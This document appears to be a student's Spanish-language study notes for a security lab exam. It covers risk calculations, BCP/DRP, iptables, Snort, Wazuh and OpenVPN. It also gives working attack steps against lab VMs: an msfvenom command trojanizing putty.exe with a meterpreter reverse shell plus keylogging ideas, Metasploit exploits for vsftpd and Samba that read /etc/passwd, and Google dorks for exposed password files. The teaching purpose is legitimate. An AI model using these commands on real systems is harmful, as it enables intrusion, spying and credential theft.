# Info
## Ayuda General
> [!NOTE] Nota sobre Parametros
> - `{domain-name}`: i.e: `duoc.cl`
> - `{domain-name-full}`:i.e: `www.duoc.cl`
> - `{lhost}` or *listener host ip*: `{ip-kali}`
> - `{lport}` or *listener port*: `{port-kali-free}` or `4444`

## Contexto
La empresa regional DMZ-Group, dedicada a entregar servicios de logística, almacenaje y distribución de materia prima a otras empresas del país, le ha solicitado lo siguiente: comprobar los controles de seguridad existentes, monitorear el tráfico de la red en busca de condiciones anómalas, configurar mecanismos de seguridad interna y hacia sucursales remotas, crear planes que permitan la continuidad del negocio y la recuperación ante un desastre y estimar la pérdida en caso de un incidente que afecte a un activo crítico para la empresa.
Para que todas las máquinas virtuales se conecten entre sí y, además, salgan a Internet, les debe agregar una interfaz de Red Nat. De esta manera estarán conectadas a una red común, aunque en algunos ítems se puede solicitar otra configuración de las interfaces.

INSTRUCCIONES ESPECÍFICAS:
Se le ha encargado realizar las siguientes tareas:
- Calcular la pérdida anualizada debido a la afectación de un activo crítico.
- Definir las fases de un plan de continuidad del negocio y de un plan de recuperación ante un desastre.
- Implementar controles se seguridad perimetral.
- Instalar y probar un sistema de detección de intrusiones.
- Instalar y probar un HIDS.
- Configurar y probar una VPN.
- Crear, para realizar una campaña de concientización, un malware básico, usando las herramientas disponibles en Kali Linux.
- Explotar un servicio de red para evidenciar las vulnerabilidades detectadas.

## Item 1
**Cálculo de pérdidas monetarias por riesgos de seguridad**

El servidor web de la empresa es un activo crítico, ya que a través de ella se realizan diversos servicios de cara a los clientes, además almacena información sensible. La empresa desea saber cuánto es el riesgo y las pérdidas debido a su inactividad y, finalmente con esta información, decidir la aplicación de un control que mitigue el riesgo.

El servidor se ha valorizado en $20.000.000, se ha definido que la exposición es del 75%. Con esto calcule el SLE. Según la exposición debido a las vulnerabilidades que se conocen y que se descubren cada cierto tiempo, se ha estimado que el servidor puede ser atacado y comprometido 1 vez cada 2 años. Con esto obtenga el ALE. Con esta información y considerando que el costo de un control es de $2.000.000 al año

1. El servidor se ha valorizado en $20.000.000, se ha definido que la exposición es del 75%. Con esto calcule el SLE.

R: El SLE representa la pérdida esperada en caso de que ocurra un único incidente. Se calcula utilizando la siguiente fórmula:
SLE = Valor del activo × Exposicion
Dado que: Valor del activo = $20.000.000
Exposición = 75% (0,75)
SLE = 20.000.000 × 0,75 = 15.000.000

El SLE es $15.000.000.

2. Según la exposición debido a las vulnerabilidades que se conocen y que se descubren cada cierto tiempo, se ha estimado que el servidor puede ser atacado y comprometido 1 vez cada 2 años. Con esto obtenga el ALE.

R: El ALE representa la pérdida esperada en un año debido a incidentes relacionados con el activo. Se calcula con la fórmula:

ALE = SLE × Frecuencia de ocurrencia anual
Dado que: SLE = $15.000.000
Frecuencia de ocurrencia anual = 1 vez cada 2 años (0,5)
ALE = 15.000.000 × 0,5 = 7.500.000
El ALE es $7.500.000.

3. Con esta información y considerando que el costo de un control es de $2.000.000 al año, ¿usted tomaría o descartaría el control?

R: El costo del control propuesto para mitigar el riesgo es de $2.000.000 al año. Para tomar una decisión, se comparan los costos:

- Pérdidas anuales estimadas (ALE) = $7.500.000
- Costo del control = $2.000.000

Dado que el costo del control es significativamente menor que las pérdidas anuales
estimadas, sería recomendable implementar el control, ya que reduce el impacto
financiero del riesgo de inactividad del servidor.

Con base en los cálculos realizados, se recomienda aplicar el control, ya que su costo anual de $2.000.000 es mucho menor que el ALE de $7.500.000. Esto permitiría mitigar el riesgo y proteger un activo crítico para la empresa.

### Ayuda Item 1
> No hay nada al respecto :(

## Ítem 2
**Planes de continuidad del negocio y de recuperación ante un desastre.**

Como el servidor web es crítico, la empresa aplicó varios controles para mitigar la probabilidad de que una amenaza se concrete, sin embargo, aún existen riesgos remanentes que se deben aceptar. Dado este escenario, la empresa quiere disminuir el impacto que esto supone.

El servidor está directamente conectado a internet, es un servidor web apache, con sistema operativo Linux. Hay una única conexión a Internet y la empresa está preocupada por eventuales ataques cibernéticos al servidor.

1. Defina las fases que se deben realizar para implementar un plan de continuidad del negocio (BCP)

R: Este plan garantiza que las operaciones críticas continúen frente a incidentes. Las fases principales son:
- Análisis del impacto (BIA): Identificar los procesos críticos y evaluar el impacto de su inactividad en la empresa.
- Evaluación de riesgos: Analizar los riesgos, priorizarlos y documentarlos.
- Estrategias de continuidad: Diseñar soluciones como servidores de respaldo o replicación en la nube.
- Documentación: Crear un plan con acciones claras y responsables asignados.
- Pruebas: Validar el plan con simulaciones y actualizarlo regularmente.

2. También para un plan de recuperación ante un desastre (DRP).

R: Este plan busca restaurar operaciones después de un incidente grave. Sus fases son:
- Preparación: Definir tiempos de recuperación (RTO/RPO) y activos críticos.
- Respaldos: Configurar copias de seguridad periódicas y almacenarlas en lugares seguros.
- Plan de recuperación: Documentar todos los pasos para restaurar el sistema y los datos asociados.
- Sitio alterno: Tener un servidor de respaldo activable en caso de emergencias.
- Pruebas: Generar simulaciones de desastres para validar y ajustar el plan.

### Ayuda Item 2
> No hay nada al respecto :(

## Ítem 3
**Implementación de reglas Iptables en firewall perimetral.**

Uno de los tantos controles que la empresa desea implementar es la configuración de reglas de filtrado de paquetes en una máquina con Linux. Este equipo está en el borde de la red, por lo que además se deben configurar reglas de NAT para permitir que los equipos internos salgan a Internet. 

Para este ítem se recomienda usar 2 máquinas virtuales, una, en donde va a implementar las reglas de iptables, debe ser Linux (cualquier VM con Linux, se recomienda Ubuntu), y la otra puede ser cualquier VM con Windows (se recomienda Windows 7), que será sólo un cliente interno para probar que todo funciona correctamente.

> [!NOTE] Nota
> - VM Linux (Kali Linux): 3 Interfaces
> 	- NAT o RED NAT
> 	- Red Interna
> 	- Solo Anfitrion
> - Win 7: 1 Interfaz
> 	- Red Interna
> - Win 10 (Windows Host) o Maquina Fisica: 1 Interfaz

| VM                       | Interfaz             | IP                                                |
| ------------------------ | -------------------- | ------------------------------------------------- |
| Firewall Linux<br>(Kali) | Red NAT              | 10.0.2.x/24                                       |
| =                        | Red Interna          | 172.16.0.1/24                                     |
| =                        | Solo Anfitrion       | 192.168.56.10x/24                                 |
| Windows HOST             | Virtualbox Host-Only | 192.168.56.1/24                                   |
| Win 7                    | Red Interna          | 172.16.0.100/24<br>GW: 172.16.0.1<br>DNS: 8.8.8.8 |

Le han solicitado configurar lo siguiente:
1. Configure el direccionamiento IP según se solicita.
2. Levante el servicio web y SSH en el firewall.
	- `systemctl status apache2`
	- `systemctl status ssh`
	- `systemctl enable --now ssh`
	- `systemctl enable --now apache2`
3. Habilite el enrutamiento IP en el firewall y pruebe conectividad entre todos los dispositivos.
	- `cat /proc/sys/net/ipv4/ip_forwarding`
	- `sysctl -w net.ipv4.ip_forward=1`
	- `cat /proc/sys/net/ipv4/ip_forward`
	- `ip -br a`
	- `ping {windows-host}`
	- `ping {win7}`
4. Configure NAT en el firewall, de tal manera que el cliente Windows salga a Internet. Defina la red origen en NAT y pruebe salida desde el cliente.
5. En el firewall establezca políticas restrictivas (DROP) en la tabla filter en las cadenas INPUT y FORWARD, no toque OUTPUT.
	- `iptables -P INPUT DROP`
	- `iptables -P FORWARD DROP`
6. Configure una regla que permita la salida a Internet desde la red interna a través del firewall. Debe permitir salir todo el tráfico, defina red origen, interfaz de entrada e interfaz de salida.
7. Configure una regla que permita entrar, desde Internet, hacia la red interna, sólo el tráfico solicitado, para esto establezca reglas established.
8. Configure una regla de entrada para permitir las respuestas de DNS, esta es la que va a permitir la resolución de nombres.
9. Configure una regla que permita administrar vía SSH el firewall, únicamente desde el equipo físico (Red sólo anfitrión).
10. Configure una regla que permita visitar la web del firewall sólo desde la red interna.
11. Usando [tcpdump](https://www.kali.org/tools/tcpdump/), visualice en tráfico saliente de la interfaz que va hacia internet, principalmente evidenciando la funcionalidad de NAT.

### Ayuda Item 3
Nota: [[999 - Archivado/IPtables|IPtables]]

- Sigue la guia para configurar IP en Kali
> [!IMPORTANT]- Evita que Kali se maree
> 0. Instala [Kali Linux](https://www.kali.org/get-kali/#kali-virtual-machines) en su ultima version para virtualbox, recomiendo la version Weekly debido a que los paquetes estan mas actualizados
> 1. Configura las 3 interfaces desde Virtualbox con la configuracion pedida en la tabla
> 2. Enciende la maquina
> 3. La interfaz `Red Interna` es la genera el problema, debes configurarla a mano
> 4. Abre una terminal, ejecuta `dhclient` y luego `ip -br a`, anota la interfaz que no esta configurada
> 5. Busca en el menu `Advanced Network`, Configura la interfaz desde el menu, configura su IP y mascara
> 6. Reinicia la maquina y revisa que consiga sus ip correctamente

## Ítem 4
**Sistema de detección de intrusos**

Usando la misma red anterior, pero levantando la VM de Kali Linux con interfaz de Red Nat, realice lo siguiente:
1. Borre todas las reglas de iptables
	- `iptables -F`
	- `iptables -t NAT -F`
	- `iptables -t filter -F`
	- `iptables -t mangle -F`
	- `iptables -X`
	- `iptables -L`
2. Restablezca las políticas por defecto a ACCEPT
	- `iptables -P INPUT ACCEPT`
	- `iptables -P FORWARD ACCEPT`
1. Realice un apt update en la VM Linux, no haga el upgrade
	- `apt update`
2. Instale SNORT usando apt install snort -y
	- `apt install snort -y`
3. Usando el modo alerta de SNORT visualice las alertas generadas por un nmap desde Kali hacia la VM Linux
4. Cree una regla que permita alertar los pings (debe visualizar los paquetes 7. ICMP con una alerta personalizada) hacia el servidor Linux
5. Cree una regla que permita alertar los accesos vía SSH (debe visualizar los accesos SSH con una alerta personalizada) hacia el servidor Linux
6. Cree una regla que permita alertar los accesos al servicio WEB (debe visualizar los paquetes HTTP con una alerta personalizada) hacia el servidor Linux

### Ayuda Item 4
#### Sistema de deteccion de instrusos
Maquinas a usar en modo Red NAT
- [Kali](https://www.kali.org/)
- [Metasploitable](https://www.rapid7.com/products/metasploit/metasploitable/) | [Guia de instalacion](https://github.com/z0s3r77/Metasplotable_2)

Paginas Apoyo
- Leer Nota [[999 - Archivado/IPtables|IPtables]]
- [Kali - Tools/snort](https://www.kali.org/tools/snort/)
- [Guia Snort en kali](https://laboratoriolinux.es/index.php/-noticias-mundo-linux-/software/35752-como-usar-snort-en-kali-linux-guia-paso-a-paso.html)

**Kali Linux**
Borrar todas las reglas de iptables
- `iptables -F`
- `iptables -t NAT -F`
- `iptables -t filter -F`
- `iptables -t mangle -F`
- `iptables -X`
- `iptables -L`

Definir reglas por defecto en ACCEPT
- `iptables -P input ACCEPT`
- `iptables -P forward ACCEPT`
- `iptables -P prerouting ACCEPT`
- `iptables -P postrouting ACCEPT`

Realizar Apt Update / NO UPGRADE
- `apt-get update`

Instalar SNORT
- `apt-get install snort -y`
- `snort -v`

Inicia en modo de prueba
> Para revisar el estado del archivo de configuracion
`sudo snort -T -c /etc/snort/snort.conf`


Iniciar snort en la interfaz
> Cambia `[interface]` por la interfaz que quiere ser analizada
- `sudo snort -A console -q -i [interface] -c /usr/local/etc/snort/snort.conf`


**Metasploitable**
> Nota: Luego de iniciar snort en Kali

Ping a maquina Kali
- `ping [ip-kali]`


**Kali**
Revisa los logs de snort
- `grep "ALERT" /var/log/snort/alert | less`
Crea regla para alertar sobre pings (ICMP) desde metasploitable
- `iptables -A INPUT -p icmp --icmp-type echo-request -j LOG --log-prefix "ICMP Detectado: "`
Crea regla para alertar sobre accesos SSH desde metasploitable
- `iptables -A INPUT -p tcp --dport 22 -m state --state NEW -j LOG --log-prefix "SSH Detectado: "`
Crea regla para alertar sobre accessos HTTP desde metasploitable
- `iptables -A INPUT -p tcp --dport 80 -m state --state NEW -j LOG --log-prefix "HTTP Detectado: "`
- `iptables -A INPUT -p tcp --dport 443 -m state --state NEW -j LOG --log-prefix "HTTPS Detectado: "`
Visualizar logs
- `tail -f /var/log/syslog`

**Metasploitable**
Envia ping
- `ping {ip-kali}`
Accede SSH
- `ssh kali@{ip-kali}`
Accede a la pagina web (Kali debe tener un servidor web habilitado)
- `curl -v http://{ip-kali}`
- `curl -v https://{ip-kali}`



## Ítem 5
**Sistema de detección de intrusiones basado en hosts**

> [!IMPORTANT] Importante
> Evidencie todo.

Use la máquina Linux (Ubuntu) como la parte Manager del ossec o wazuh y un cliente Windows 7 como el agente ossec (wazuh).

1. Instale en la VM Linux los componentes del Manager de ossec o Wazuh
	- `curl -sO https://packages.wazuh.com/4.9/wazuh-install.sh && sudo bash ./wazuh-install.sh -a`
2. Instale el agente en el cliente Windows
	- Descarga desde [Wazzuh - Install Windows Endpoint Agent Guide](https://documentation.wazuh.com/current/installation-guide/wazuh-agent/wazuh-agent-package-windows.html)
	- Ejecutar desde Powershell en Modo Administrador
	- `.\wazuh-agent-4.9.2.1.msi \q WAZUH_MANAGER="{ip-dashboard}"`
	- `NET START Wazuh`
1. En el cliente Windows cree y elimine usuarios desde el panel de control o desde la CLI, observe y evidencie esos eventos
	- Abre la IP de Wazuh en el navegador
	- ve a `{ip-dashboard}/app/security-dashboards-plugins#/users/create` para crear un usuario interno
	- en el mismo menu de usuarios internos y podras borrarlo
1. Cierre la sesión o reinicie el cliente Windows, observe y evidencie ese evento en el dashboard o terminal del Manager
	- Desde GUI no encontre esta opcion
2. Esos cambios se deben ver reflejados en el dashboard o terminal del Manager
	- Ve a `{ip-dashboard}/app/logs#/manager/?tab=logs`

### Ayuda Item 5
#### Deteccion de Instrusos basados en HOSTS (Wazuh)
Maquinas Usadas
- [Kali](https://www.kali.org/)
- Windows 7
Sitios usados
- [OSSEC](https://www.ossec.net/)
- [Wazuh](https://wazuh.com/) 
	- Linux
		- [Quickstart all-in-one](https://documentation.wazuh.com/current/quickstart.html)
		- [Agente](https://documentation.wazuh.com/current/installation-guide/wazuh-agent/wazuh-agent-package-linux.html) (Opcional)
	- Windows
		- [Agente](https://documentation.wazuh.com/current/installation-guide/wazuh-agent/wazuh-agent-package-windows.html)

Instalacion Rapida Kali Linux
- Inicia Kali con red Puente
- Anota la ip de la maquina Kali con `ip -br a`, sera `{ip-kali}`

Script automatico | [Quickstart](https://documentation.wazuh.com/current/quickstart.html)
- `curl -sO https://packages.wazuh.com/4.9/wazuh-install.sh && sudo bash ./wazuh-install.sh -a`

Cuando termine, lanzara un mensaje
> [!NOTE] Mensaje Instlacion completada con Wazzuh
> ```
> INFO: --- Summary ---
> INFO: You can access the web interface https://{wazuh-dashboard-ip}
>     User: admin
>     Password: {ADMIN_PASSWORD}
> INFO: Installation finished.
- Accedes a travez de un navegador con `https://{wazuh-dashboard-ip}`

Instalacion Agente Linux
- `curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import && chmod 644 /usr/share/keyrings/wazuh.gpg`
- `echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | tee -a /etc/apt/sources.list.d/wazuh.list`
- `apt-get update`
- `WAZUH_MANAGER="{ip-kali}" apt-get install wazuh-agent` recuerda cambiar {ip-kali}
- `systemctl daemon-reload`
- `systemctl enable --now wazuh-agent`
- `sed -i "s/^deb/#deb/" /etc/apt/sources.list.d/wazuh.list`
- `apt-get update`

Instalacion Agente Windows 7
- Descarga el instalador MSI de la [GUIA](https://documentation.wazuh.com/current/installation-guide/wazuh-agent/wazuh-agent-package-windows.html) oficial
- Abre una ventana CMD en modo administrador
- `wazuh-agent-4.9.2-1.msi /q WAZUH_MANAGER="{ip-kali}"`
- `NET START Wazuh`



## Ítem 6
**Red Privada Virtual (VPN)**

Para este ítem puede dejar sólo 2 VMs activas, Kali Linux y un Windows 7. Ambas máquinas virtuales con interfaz de Red Nat:

Adjunto: El archivo de configuracion de `server.conf` contiene la siguiente informacion
```
dev tun
ifconfig 192.168.10.1 192.168.10.2
secret /etc/openvpn/ta.key
port 1194
proto udp
keepalive 10 120
persist-key
persist-tun
verb 3
```

Adjunto: EL archivo de configuracion de `cliente.opvn` contiene la siguiente informacion
```
remote {ip-kali} 1194
dev tun
ifconfig 192.168.16.0.2 192.168.16.0.1
secret ta.key
proto udp
nobind
persist-key
persist-tun
verb 3
```

1. Instale openvpn en Windows 7, usar la [versión 2.5 de OpenVPN](https://swupdate.openvpn.org/community/releases/OpenVPN-2.5.0-I601-x86.msi)
	- No veo porque no usar la [ultima version](https://openvpn.net/community-downloads/), Apreta Next y Next hasta que este instalado
2. Configure lo necesario en Kali en los archivos de openvpn, genere la llave y compártala con el cliente, establezca como IP origen la 192.168.10.1 y la destino la 192.168.10.2 y levante openvpn.
	- Configura OpenVPN
		- `apt update`
		- `apt install openvpn`
	- Configura
		- `cd /etc/openvpn`
		- `openvpn --genkey secret ta.key`
		- Modifica `nano /etc/openvpn/server.conf` con el codigo adjunto al principio
		- Luego inicia el servidor con `systemctl start openvpn@server`
3. Configure lo necesario en Windows, en el archivo de configuración de openvpn, establezca como IP origen la 192.168.0.2 y la destino la 192.168.0.1 y levante openvpn.
	- Copia el archivo `/etc/openvpn/server.conf` y muevelo a Windows 7 con le nombre `cliente.ovpn`
	- Modifica la 3ra linea a lo siguiente: `ifconfig 192.168.0.2 192.168.0.1`
4. Pruebe conectividad entre las IP de la VPN.
	- Haz Ping a la ip `192.168.0.1` desde Windows
	- Haz Ping a la ip `192.168.0.2` desde Kali

### Ayuda Item 6
#### Crear VPN
> [!NOTE] Nota
> Para mayor simplicidad, solo usare llaves Estaticas compartidas, en vez de crear una PKI con EasyRSA

Maquinas Usadas en Red NAT
- Win 7
- [Kali](https://www.kali.org/)

Paginas Usadas
- OpenVPN | [Sitio Oficial](https://openvpn.net/community-resources/) y [Documentacion](https://openvpn.net/community-resources/)

Kali Linux
- `apt-get install openvpn`
- `openvpn --genkey --secret static.key`
- `sudo cp static.key /etc/openvpn/`
- Modifica el archivo con `sudo micro /etc/openvpn/server.conf`
```
dev tun
ifconfig 172.16.0.1 172.16.0.2
secret /etc/openvpn/static.key
port 1194
proto udp
keepalive 10 120
persist-key
persist-tun
verb 3
```
- Inicia el servidor con `sudo systemctl start openvpn@server`

Windows 7
- Instalar [OpenVPN Community](https://openvpn.net/community-downloads/) y ejecutarlo
- Envia los archivos `static.key` y dejalo en la carpeta `C:\Program Files\OpenVPN\config`
- Crea un archivo llamado `client.ovpn` en la carpeta `C:\Program Files\OpenVPN\config` que contenga lo siguiente, recuerda modificar {ip-kali}
```
remote {ip-kali} 1194
dev tun
ifconfig 172.16.0.2 172.16.0.1
secret static.key
proto udp
nobind
persist-key
persist-tun
verb 3
```
- Ejecuta `OpenVPN GUI` como administrador
- Haz click en "Conectar"

Probar conectividad
Windows 7
- `ping 172.16.0.1`
Kali
- `ping 172.16.0.2`



## Ítem 7
**Creación de malware**

Usando msfvenom, cree un malware con una plantilla de un portable ejecutable (PE) como Putty.exe. (32 Bits)

1. Defina los parámetros correspondientes de IP y puerto hacia la cual realizar la Shell reversa
2. Use como payload el reverse_tcp de meterpreter
3. Defina como codificación x86/shikata_ga_nai con 5 iteraciones
4. Realice el envío del malware a Windows
5. Ejecute el malware y tome control de la víctima
6. Evidencie el compromiso ingresando a la Shell de Windows y ejecutando comandos

### Ayuda Item 7
#### Creacion de Malware
Maquinas
- [Kali](https://www.kali.org/)
- Win 7

Herramientas
- [Putty](https://tartarus.org/~simon/putty-snapshots/w32/): Link a la version x86 32 Bits, debes descargar `putty.exe`
	- Descarga con Curl: `wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe`
- Ayuda
	- [Offsec Blog- Backdooring Exe Files](https://www.offsec.com/metasploit-unleashed/backdooring-exe-files/) 
	- [Metasploit Docs - How to use a Reverse Shell](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html)
	- [Medium Blog - Create Reverse Shell](https://medium.com/@jbtechmaven/ethical-hacking-reverse-shell-attack-using-metasploit-57e9cd400c88)

Pasos
- Recuerda modificar los parametros {ip-kali} por la ip de tu maquina
```
msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost={ip-kali} lport=4444 -e x86/shikata_ga_nai -i 10 -b "\x00" -f exe -o putty32virus.exe
```
- Abre una consola extra y ejecuta `msfconsole`
- `use exploit/multi/handler`
- `set PAYLOAD windows/meterpreter/reverse_tcp`
- `set LHOST {ip-kali}`
- `set LPORT 4444`
- `exploit`
- Vuelve a tu consola principal
- Instala servidor apache con `apt-get install apache2`
- Activa servidor con `systemctl start apache2`
- Mueve el archivo `putty32virus.exe` a `/var/www/html`
- Si no funciona elimina el archivo `/var/www/html/index.html`
- Abre tu maquina Win 7
- Abre la IP de Kali en el navegador
- Descarga y ejecuta el archivo, de esta forma ya puedes usar tu consola de kali con `msfconsole` para controlar la maquina, te dejo algunas ideas
	- `keyscan_start` -> (escribe informacion en windows) -> `keyscan_dump` -> `keyscan_stop`
	- `shell` -> `starte explorer.exe` -> `exit` -> `keyboard_send google.com` -> `keyevent 13` (debes encontrar el evento a la key de enter) -> `shell` -> `TASKKILL /F /IM explorer.exe`


## Ítem 8
**Explotación de vulnerabilidad**

Maquinas:
- Kali Linux (Red NAT)
- Metasploitable 2 (Red NAT)

1. Use nmap para escanear los servicios, versión y usando los scripts de nmap (--script=vuln) descubre vulnerabilidades en el equipo target (víctima)
2. Usando el Metasploit Framework busque un exploit de Samba, cargue el exploit usando un payload funcional, configure las opciones y realice la explotación del servicio
3. Debe evidenciar la explotación exitosa accediendo a la terminal de la víctima a través de la Shell de Metasploit Framework y ejecutar comandos de Linux.

### Ayuda Item 8
## Explotacion de Vulnerabilides
Maquinas a usar en modo Red NAT
- [Kali](https://www.kali.org/)
- [Metasploitable2](https://www.rapid7.com/products/metasploit/metasploitable/)

Ayuda
- NMAP
	- [vulnersCom/namp-vulners NSE nmap repo](https://github.com/vulnersCom/nmap-vulners)
	- [esecurityplanet - Nmap Vulnerability made easy](https://www.esecurityplanet.com/networks/nmap-vulnerability-scanning-made-easy/)
	- [Nmap Docs - NSE Usage](https://nmap.org/book/nse-usage.html)
- vsFTP
	- [Medium Blog - Exploiting vsFTP](https://medium.com/@josegpach/exploiting-ftp-vulnerabilities-on-metasploitable-2-bbd935d42e23)

**Kali Linux**
Escaneo de puertos
- `ping {ip-metasploitable}`
- `nmap --script-updatedb`
- `nmap -sV --script vuln {ip-metasploitable}`
Atacar Puerto 21
- `nmap -sS -sV -O {ip-metasploitable}`: Ver que version esta ejecutando en el puerto 21
- `msfconsole`
- `search vsftpd 2.3.4`: Buscar exploit para esa version de vsftpd
- `use exploit/unix/ftp/vsftpd_234_backdoor`
- `show options`
- `set RHOSTS {ip-metasploitable}`
- `exploit`
Verificar Ataque
- `ipconfig`
- `whoami`
- `ls`
- `cat /etc/passwd`



Maquinas Usadas en Red NAT
- [Kali](https://www.kali.org/)
- [Metasploitable](https://www.rapid7.com/products/metasploit/metasploitable/)

Ayuda
- NMAP
	- [vulnersCom/namp-vulners NSE nmap repo](https://github.com/vulnersCom/nmap-vulners)
	- [esecurityplanet - Nmap Vulnerability made easy](https://www.esecurityplanet.com/networks/nmap-vulnerability-scanning-made-easy/)
	- [Nmap Docs - NSE Usage](https://nmap.org/book/nse-usage.html)
- SMB
	- [Hackerhalt Medium - SMB Explotation](https://hackerhalt.medium.com/techniques-for-exploiting-smb-servers-64a369711ea6)
	- [HackingArticles - SMB Enumeration Guide](https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/)

### A. Footprinting al servicio SAMBA
Desde la maquina Kali a Metasploit
**Pasos Kali**
- Escaneo de puertos
	- `ping {ip-metasploitable}`
	- `nmap {ip-metasploitable} -sV`
	- `nmap {ip-metasploitable} -p445,139 -sV`
### B. Creacion de Exploit para samba
Desde la maquina Kali a Metasploit
- Crear exploit
	- `use exploit/multi/samba/usermap_script`
	- `show options`
	- `set RHOST {ip-metasploitable}`
	- `set RPORT 139`
	- `set LHOST {ip-kali}`
	- `set LPORT 4444`
	- `run`
- Metodo 2: Automatico
	- `smbmap -H {ip-metasploitable}`

### C. Explotacion del Servicio
Incluya la demostracion de la conexion remota donde aparezca el nombre del servidor y la version del SO
- `nmap --script smb-os-discovery {ip-metasploitable}`
- `smbclient -N -L //{ip-metasploitable}`
- `smbclient //{ip-metasploitable}/{vulnerable-folder}`
	- `srvinfo`
	- `enumdomains`
	- `querydominfo`
	- `netshareenumall`
	- `enumdomusers`


---
---
---
---
---

# Deprecated (No Usar)
## Instalacion completa de Wazuh
Para efectos practicos, el uso es ligero y rapido, no hay que montar un servidor completo sino usarlo, por lo que esta instalacion es demaciado complicada.

- |  | [Crear Certificados Linux](https://documentation.wazuh.com/current/user-manual/wazuh-dashboard/certificates.html) | [Guia Agente Linux](https://documentation.wazuh.com/current/installation-guide/wazuh-agent/wazuh-agent-package-linux.html) | [Guia Agente Windows](https://documentation.wazuh.com/current/installation-guide/wazuh-agent/wazuh-agent-package-windows.html)

Pasos instalacion Kali WAZUH
- Inicia Kali con red Puente
- Anota la ip de la maquina Kali con `ip -br a`, sera {ip-kali}

Instalacion Dashboard Linux | [Guia Paso a Paso](https://documentation.wazuh.com/current/installation-guide/wazuh-dashboard/step-by-step.html)
- Instala las dependencias
```
apt-get install debhelper tar curl libcap2-bin gnupg apt-transport-https debconf adduser procps filebeat micro
```
- Instala las llaves publicas del repositorio
```
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import && chmod 644 /usr/share/keyrings/wazuh.gpg
```
- Activa el repositorio
```
echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | tee -a /etc/apt/sources.list.d/wazuh.list
```
- `apt-get update`
- `apt-get -y install wazuh-dashboard`
- Edita el archivo `/etc/wazuh-dashboard/opensearch_dashboards.yml`
    - Modifica la entrada `server.host` con {ip-kali}
    - Modifica la entrada `opensearch.hosts` con las fuentes separadas por comas `["https://{ip-kali}:9200"]`
    - Modifica la entrada `name` al nombre, sera usado con `$NODE_NAME`
- `wget https://packages.wazuh.com/4.9/config.yml`
- `wget https://packages.wazuh.com/4.9/wazuh-certs-tool.sh`
- Edita el archivo `config.yml` con los siguientes
    - node → ip: {ip-kali}
    - server → ip: {ip-kali}
    - dashboard → ip: {ip-kali}
    - NOTA: Puedes borrar las demas entradas comentadas o dejarlas asi
- ejecuta el script `bash wazuh-certs-tools-sh -A`
- Crea la carpeta `mkdir /etc/wazuh-dashboard/certs`
- Comprime los certificados `tar -cvf ./wazuh-certificates.tar -C ./wazuh-certificates/ .`
- Elimina la carpeta `rm -rf ./wazuh-certificates`
- Descomprime los certificados en todos los nodos
	- si configuraste el nombre en config.yaml como: `name=node-1` -> ejecuta en la terminal `NODE_NAME=node-1`
	- Asi con cada nodo hasta que hayas configurado todos los que esten en config.yml, ejemplo: `name=Fernando` -> ejecuta `NODE_NAME=Fernando`
- Repite el paso anterior luego de ejecutar la siguiente secuencia por cada nodo
	- `tar -xf ./wazuh-certificates.tar -C /etc/wazuh-dashboard/certs/ ./$NODE_NAME.pem ./$NODE_NAME-key.pem ./root-ca.pem`
	- `mv -n /etc/wazuh-dashboard/certs/$NODE_NAME.pem /etc/wazuh-dashboard/certs/dashboard.pem`
	- `mv -n /etc/wazuh-dashboard/certs/$NODE_NAME-key.pem /etc/wazuh-dashboard/certs/dashboard-key.pem`
	- `chmod 500 /etc/wazuh-dashboard/certs`
	- `chmod 400 /etc/wazuh-dashboard/certs/*`
	- `chown -R wazuh-dashboard:wazuh-dashboard /etc/wazuh-dashboard/certs`
- Recarga las configuraciones con `systemctl daemon-reload`
- `systemctl enable --now wazuh-dashboard`
- Edita `/usr/share/wazuh-dashboard/data/wazuh/config/wazuh.yml` en la seccion "url", configurando 
	- `url: https://{ip-kali}`
- Acceder desde Firefox a `https://{ip-kali}` o `https://{ip-kali}:55000`, con las siguientes credenciales
	- `username: admin`
	- `password: admin`

## Busqueda de informacion en internet

Sitios Web:
- [Lookup Icann](https://lookup.icann.org/en) | [Whois](https://www.whois.com/whois/) | [rfc1036/whois](https://github.com/rfc1036/whois) | [IANA Domains Root](https://www.iana.org/domains/root/db)
	- Buscar sitios como `duoc.cl`
- [Google](https://www.google.com/)
	- Permite hacer busquedas con parametros especiales "Google Dorking"
		- `filetype:xls inurl:”email.xls”`
		- `?intitle:index.of?mp3 queen`
		- `filetype:sql “MySQL dump” (pass|password|passwd|pwd)`
		- `site:gov filetype:doc allintitle:restricted`
		- `inurl:”ViewerFrame?Mode=”`
- [GHDB](https://github.com/readloud/Google-Hacking-Database) (Google Hacking DataBase): [Exploit-db](https://www.exploit-db.com/google-hacking-database) | [Maltergo (OS)](https://www.maltego.com/downloads/)
	- Ver archivos con contraseñas
	- Acceso a bases de datos
	- Sitios con wordpress vulnerables
- [Netcraft Tools](https://www.netcraft.com/tools/) | [Netcraft Site Report](https://sitereport.netcraft.com/)
	- Ver informacion asociada a los sitios, como Bloque Host, Compañia de Host, IPv4, AS BGP, IPv6, Delegacion de IPs entre otros
- [Shodan](https://www.shodan.io/)
	- Permite buscar sitios con vulnerabilidades, separarlos por paises y por puerto, entre otros
	- Ejemplos de busqueda (Separados con un espacio entre ellos)
		- `port:{port-number}`: Por Puerto
		- `country:{country-code}`: Por Pais
		- `{domain-name}`: Por Dominio Base
		- `Apache/{version}`: Por Version Apache
		- `title:"ISS Windows Server"`: Por Servidor de Windows
		- `/cgi-bin/guestimage.html`: Por camaras en vivo -> [insecam](http://insecam.org/)
- [Kali Linux (OS)](https://www.kali.org/)
	- Suite para Aprender sobre vulnerabilidades
		- Ejemplo de Uso
			- Levantar VM con Red NAT
			- `setxkbmap -layout latam`: Poner teclado español
			- `nc {domain-name} {port-number}`
			- `sudo nmap -sV -O -p 80 {domain-name}`
			- `nikto -h {domain-name}`
			- `whatweb -v {domain-name}`
			- `curl -v {domain-name}`
